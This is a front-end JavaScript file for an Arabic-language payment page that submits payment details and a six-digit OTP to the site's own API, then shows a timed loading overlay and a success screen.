let currentPaymentId = null;

// Navigation
document.querySelectorAll('.nav-link').forEach(link => {
    link.addEventListener('click', (e) => {
        e.preventDefault();
        const page = link.getAttribute('data-page');
        navigateTo(page);
    });
});

function navigateTo(page) {
    // Hide all pages
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    
    // Show selected page
    document.getElementById(page).classList.add('active');
    
    // Update active nav link
    document.querySelectorAll('.nav-link').forEach(link => {
        link.classList.remove('active');
        if (link.getAttribute('data-page') === page) {
            link.classList.add('active');
        }
    });
}

// Payment Form
document.getElementById('paymentForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const phone = document.getElementById('phone').value;
    const amount = document.getElementById('amount').value;
    const paymentMethod = document.getElementById('paymentMethod').value;
    const description = document.getElementById('description').value;
    
    try {
        const response = await fetch('/api/payments/create', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                phone,
                amount,
                paymentMethod,
                description
            })
        });
        
        const data = await response.json();
        
        if (data.success) {
            currentPaymentId = data.paymentId;
            showStatus('تم إنشاء الطلب بنجاح! سيتم إرسال رمز التحقق إلى هاتفك.', 'success');
            
            // Clear form
            document.getElementById('paymentForm').reset();
            
            // Show OTP modal after 2 seconds
            setTimeout(() => {
                showOTPModal();
            }, 2000);
        } else {
            showStatus('حدث خطأ في إنشاء الطلب', 'error');
        }
    } catch (error) {
        console.error('Error:', error);
        showStatus('حدث خطأ في الاتصال بالخادم', 'error');
    }
});

function showStatus(message, type) {
    const statusDiv = document.getElementById('paymentStatus');
    statusDiv.textContent = message;
    statusDiv.className = `status-message ${type}`;
}

function showOTPModal() {
    document.getElementById('otpModal').classList.add('active');
}

function closeOTPModal() {
    document.getElementById('otpModal').classList.remove('active');
    document.getElementById('otpInput').value = '';
}

async function verifyOTP() {
    const otp = document.getElementById('otpInput').value;
    
    if (!otp || otp.length !== 6) {
        alert('الرجاء إدخال رمز التحقق الصحيح');
        return;
    }
    
    try {
        const response = await fetch(`/api/payments/${currentPaymentId}/verify-otp`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ otp })
        });
        
        const data = await response.json();
        
        if (data.success) {
            closeOTPModal();
            showStatus('تم التحقق من الهوية بنجاح! جاري معالجة الطلب...', 'success');
            
            // Redirect to loading page
            setTimeout(() => {
                showLoadingPage();
            }, 2000);
        } else {
            alert('رمز التحقق غير صحيح. الرجاء المحاولة مرة أخرى.');
            document.getElementById('otpInput').value = '';
        }
    } catch (error) {
        console.error('Error:', error);
        alert('حدث خطأ في التحقق من الرمز');
    }
}

function selectProduct(productName, price) {
    document.getElementById('description').value = productName;
    document.getElementById('amount').value = price;
    navigateTo('pay');
    document.getElementById('phone').focus();
}

function showLoadingPage() {
    // Create a loading page overlay
    const loadingPage = document.createElement('div');
    loadingPage.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        display: flex;
        justify-content: center;
        align-items: center;
        z-index: 2000;
        flex-direction: column;
    `;
    
    loadingPage.innerHTML = `
        <div style="text-align: center; color: white;">
            <div style="font-size: 48px; margin-bottom: 20px;">⏳</div>
            <h2>جاري معالجة طلبك</h2>
            <p>الرجاء الانتظار...</p>
            <div style="margin-top: 30px; width: 200px; height: 4px; background: rgba(255,255,255,0.3); border-radius: 2px; overflow: hidden;">
                <div style="height: 100%; background: white; animation: progress 2s ease-in-out; width: 0%;"></div>
            </div>
        </div>
        <style>
            @keyframes progress {
                0% { width: 0%; }
                100% { width: 100%; }
            }
        </style>
    `;
    
    document.body.appendChild(loadingPage);
    
    // Remove after 3 seconds and show success
    setTimeout(() => {
        loadingPage.remove();
        showSuccessPage();
    }, 3000);
}

function showSuccessPage() {
    const successPage = document.createElement('div');
    successPage.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: linear-gradient(135deg, #4caf50 0%, #45a049 100%);
        display: flex;
        justify-content: center;
        align-items: center;
        z-index: 2000;
        flex-direction: column;
    `;
    
    successPage.innerHTML = `
        <div style="text-align: center; color: white;">
            <div style="font-size: 64px; margin-bottom: 20px;">✓</div>
            <h2>تم بنجاح!</h2>
            <p>تم معالجة طلبك بنجاح</p>
            <button onclick="location.reload()" style="
                margin-top: 30px;
                padding: 10px 30px;
                background: white;
                color: #4caf50;
                border: none;
                border-radius: 5px;
                font-weight: bold;
                cursor: pointer;
            ">العودة للصفحة الرئيسية</button>
        </div>
    `;
    
    document.body.appendChild(successPage);
}

// Close OTP modal when clicking outside
document.getElementById('otpModal').addEventListener('click', (e) => {
    if (e.target.id === 'otpModal') {
        closeOTPModal();
    }
});

// Allow Enter key to submit OTP
document.getElementById('otpInput').addEventListener('keypress', (e) => {
    if (e.key === 'Enter') {
        verifyOTP();
    }
});
